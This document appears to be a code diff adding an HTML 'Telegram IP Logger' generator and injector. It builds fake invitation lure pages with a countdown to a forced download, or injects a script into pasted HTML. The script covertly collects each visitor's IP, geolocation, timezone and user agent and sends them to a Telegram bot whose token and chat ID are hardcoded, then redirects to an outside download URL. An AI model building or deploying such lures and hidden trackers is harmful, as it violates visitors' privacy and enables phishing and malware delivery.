@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Logger Injector / Generator</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0f0f1a;
+      color: #e0e0ff;
+      margin: 0;
+      padding: 30px;
+      line-height: 1.6;
+    }
+    h1 { color: #a78bfa; text-align: center; margin-bottom: 0.6em; }
+    .form-container {
+      max-width: 780px;
+      margin: 0 auto;
+      background: #1a1a2e;
+      padding: 35px;
+      border-radius: 14px;
+      box-shadow: 0 0 30px rgba(120,100,220,0.3);
+    }
+    label { display: block; margin: 20px 0 6px; font-weight: 600; color: #c3b1ff; }
+    input, textarea, select {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #444;
+      border-radius: 6px;
+      background: #0d0d1a;
+      color: #e0e0ff;
+      font-family: monospace;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+    textarea { min-height: 180px; resize: vertical; }
+    button {
+      background: #7c3aed;
+      color: white;
+      border: none;
+      padding: 16px 36px;
+      font-size: 1.1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 30px auto;
+      display: block;
+    }
+    button:hover { background: #9f7aea; }
+    #output {
+      margin-top: 35px;
+      background: #000;
+      color: #0f0;
+      padding: 22px;
+      border-radius: 10px;
+      white-space: pre-wrap;
+      font-family: 'Consolas', monospace;
+      max-height: 70vh;
+      overflow: auto;
+      border: 1px solid #333;
+      font-size: 0.94rem;
+    }
+    .note { font-size: 0.9rem; color: #aaa; text-align: center; margin-top: 12px; }
+    fieldset {
+      border: 1px solid #444;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 25px 0;
+    }
+    legend { color: #a78bfa; font-weight: bold; padding: 0 12px; }
+    .mode-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .mode-tab {
+      padding: 10px 20px;
+      background: #2a2a44;
+      border-radius: 8px 8px 0 0;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .mode-tab.active {
+      background: #7c3aed;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h1>Telegram IP Logger – Generator or Injector</h1>
+
+  <div class="mode-tabs">
+    <div class="mode-tab active" onclick="switchMode('generate')">Generate New Page</div>
+    <div class="mode-tab" onclick="switchMode('inject')">Inject into Existing HTML</div>
+  </div>
+
+  <fieldset id="telegram-fieldset">
+    <legend>Telegram & Redirect Config</legend>
+    <label>Bot Token</label>
+    <input type="text" id="token" value="8500997987:AAFxw-ff5N_5KJNnxrolyFOUCgMCLB8Lb_I">
+
+    <label>Chat ID</label>
+    <input type="text" id="chatId" value="7143130635">
+
+    <label>Redirect / Download URL</label>
+    <input type="url" id="redirectUrl" value="https://nimt.life/">
+  </fieldset>
+
+  <div id="generate-section">
+    <!-- Same fields as previous advanced generator -->
+    <fieldset>
+      <legend>Page Appearance (for new page only)</legend>
+      <label>Page Title</label>
+      <input type="text" id="pageTitle" value="Punchbowl Invitation – You're Invited!">
+
+      <label>Main Heading</label>
+      <input type="text" id="heading" value="You’re Invited!">
+
+      <label>From text (optional)</label>
+      <input type="text" id="fromName" value="A friend">
+
+      <label>Main description</label>
+      <textarea id="description" rows="3">A friend has sent you an invitation.<br>Open to see details</textarea>
+
+      <label>PC-only warning</label>
+      <input type="text" id="pcOnlyText" value="This invitation can only be viewed on Windows/PC devices">
+
+      <label>Background gradient start</label>
+      <input type="color" id="bgStart" value="#F8E7B9">
+
+      <label>Background gradient end</label>
+      <input type="color" id="bgEnd" value="#E3C77A">
+
+      <label>Button color</label>
+      <input type="color" id="buttonColor" value="#BFA45A">
+    </fieldset>
+
+    <fieldset>
+      <legend>Behavior</legend>
+      <label>Countdown seconds</label>
+      <input type="number" id="countdownSec" value="3" min="1" max="15">
+
+      <label>Report delay (ms)</label>
+      <input type="number" id="reportDelay" value="1200" min="300">
+    </fieldset>
+  </div>
+
+  <div id="inject-section" style="display:none;">
+    <fieldset>
+      <legend>Your Existing HTML Code</legend>
+      <label>Paste full HTML source here (including &lt;!DOCTYPE&gt;...&lt;/html&gt;)</label>
+      <textarea id="userHtml" rows="12" placeholder="Paste your complete static HTML page here..."></textarea>
+      <div style="margin-top:10px; font-size:0.9rem; color:#bbb;">
+        The tool will try to insert the logger + countdown script just before &lt;/body&gt;.<br>
+        If no &lt;/body&gt; found → appends at end.
+      </div>
+    </fieldset>
+  </div>
+
+  <button onclick="generateOrInject()">Generate / Inject Code</button>
+
+  <div id="output"></div>
+  <div class="note">Copy the result → save as index.html → host on Replit / Vercel / etc.</div>
+</div>
+
+<script>
+let currentMode = 'generate';
+
+function switchMode(mode) {
+  currentMode = mode;
+  document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active'));
+  event.target.classList.add('active');
+
+  document.getElementById('generate-section').style.display = mode === 'generate' ? 'block' : 'none';
+  document.getElementById('inject-section').style.display = mode === 'inject' ? 'block' : 'none';
+}
+
+function escapeHtml(str) {
+  return str.replace(/[&<>"']/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":"&#039;" })[m]);
+}
+
+function generateOrInject() {
+  const token       = document.getElementById('token').value.trim();
+  const chatId      = document.getElementById('chatId').value.trim();
+  const redirect    = document.getElementById('redirectUrl').value.trim() || 'https://example.com';
+
+  if (!token || !chatId) {
+    alert("Token and Chat ID required");
+    return;
+  }
+
+  let finalCode = '';
+
+  if (currentMode === 'generate') {
+    // ── Generate new page (same logic as before, abbreviated here for brevity) ──
+    const title     = escapeHtml(document.getElementById('pageTitle').value.trim());
+    const heading   = escapeHtml(document.getElementById('heading').value.trim());
+    const from      = escapeHtml(document.getElementById('fromName').value.trim());
+    const desc      = escapeHtml(document.getElementById('description').value.trim());
+    const pcOnly    = escapeHtml(document.getElementById('pcOnlyText').value.trim());
+    const bg1       = document.getElementById('bgStart').value;
+    const bg2       = document.getElementById('bgEnd').value;
+    const btnColor  = document.getElementById('buttonColor').value;
+    const cntSec    = parseInt(document.getElementById('countdownSec').value) || 3;
+    const delay     = parseInt(document.getElementById('reportDelay').value) || 1200;
+
+    // Build countdown steps...
+    let countdownCode = '';
+    for (let i = cntSec - 1; i >= 1; i--) {
+      countdownCode += `setTimeout(() => { counter.innerHTML = "Downloading will start automatically in ${i} second${i>1?'s':''}..."; }, ${(cntSec - i)*1000});\n    `;
+    }
+
+    finalCode = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>${title}</title>
+  <style>
+    body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:linear-gradient(180deg, ${bg1}, ${bg2}); font-family:Arial,sans-serif; color:#6E7A8A; }
+    /* ... rest of styles ... abbreviated ... */
+  </style>
+</head>
+<body>
+  <!-- Your generated content here -->
+  <h1>${heading}</h1>
+  <p>${from ? 'From ' + from : ''}<br>${desc}</p>
+  <!-- ... more HTML ... -->
+<script>
+// CONFIG
+const TELEGRAM = { token: '${token}', chatId: '${chatId}' };
+const DOWNLOAD_URL = '${redirect}';
+
+// reportVisitor() function here (same as before)
+async function reportVisitor() { /* ... full report code ... */ }
+
+// getIP, getGeo functions...
+
+${delay > 0 ? `window.addEventListener('load', () => setTimeout(reportVisitor, ${delay}));` : ''}
+
+window.onload = function () {
+  const counter = document.getElementById("counter");
+  ${countdownCode}
+  setTimeout(() => {
+    // start redirect
+    window.location.href = DOWNLOAD_URL;
+  }, ${cntSec * 1000});
+};
+
+function relunch() { window.location.href = DOWNLOAD_URL; }
+</script>
+</body>
+</html>`;
+    // Note: in real code you would expand the full HTML + styles + loader etc.
+    // For brevity I'm showing structure only
+  } else {
+    // ── Inject mode ──
+    const userHtml = document.getElementById('userHtml').value.trim();
+
+    if (!userHtml) {
+      alert("Paste your HTML code first");
+      return;
+    }
+
+    const scriptToInject = `
+<script>
+// Telegram IP Logger + Redirect (injected)
+
+const TELEGRAM = { token: '${token}', chatId: '${chatId}' };
+const DOWNLOAD_URL = '${redirect}';
+
+async function reportVisitor() {
+  try {
+    const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(d => d.ip || '—');
+    const geoRaw = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+    const geo = geoRaw.city ? \`\${geoRaw.city} / \${geoRaw.region || '?'} / \${geoRaw.country_name || '?'} (\${geoRaw.ip})\` : '—';
+
+    const msg = \`
+🌐 VISIT
+IP: \${ip}
+Geo: \${geo}
+TZ: \${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Time: \${new Date().toLocaleString()}
+Page: \${location.href}
+UA: \${navigator.userAgent.slice(0,100)}
+***MITD fka Notrealghost***\`.trim();
+
+    const url = \`https://api.telegram.org/bot\${TELEGRAM.token}/sendMessage?chat_id=\${TELEGRAM.chatId}&text=\${encodeURIComponent(msg)}&disable_web_page_preview=true\`;
+    new Image().src = url;
+    fetch(url, {mode:'no-cors'}).catch(()=>{});
+  } catch(e){}
+}
+
+// Optional: report on load
+setTimeout(reportVisitor, 1400);
+
+// Optional countdown + redirect (if you want to add it)
+window.addEventListener('load', () => {
+  // If you have elements with id="counter", "loaderBar" etc., you can add countdown here
+  // Otherwise just redirect after delay if desired
+  // setTimeout(() => { location.href = DOWNLOAD_URL; }, 8000);
+});
+
+function relunch() {
+  reportVisitor();
+  location.href = DOWNLOAD_URL;
+}
+</script>`;
+
+    // Simple injection logic
+    const bodyCloseIndex = userHtml.toLowerCase().lastIndexOf('</body>');
+    if (bodyCloseIndex !== -1) {
+      finalCode = userHtml.slice(0, bodyCloseIndex) + scriptToInject + userHtml.slice(bodyCloseIndex);
+    } else {
+      // No </body> → append at end (before </html> if present)
+      const htmlCloseIndex = userHtml.toLowerCase().lastIndexOf('</html>');
+      if (htmlCloseIndex !== -1) {
+        finalCode = userHtml.slice(0, htmlCloseIndex) + scriptToInject + userHtml.slice(htmlCloseIndex);
+      } else {
+        finalCode = userHtml + '\n' + scriptToInject;
+      }
+    }
+  }
+
+  document.getElementById('output').textContent = finalCode;
+}
+</script>
+</body>
+</html>
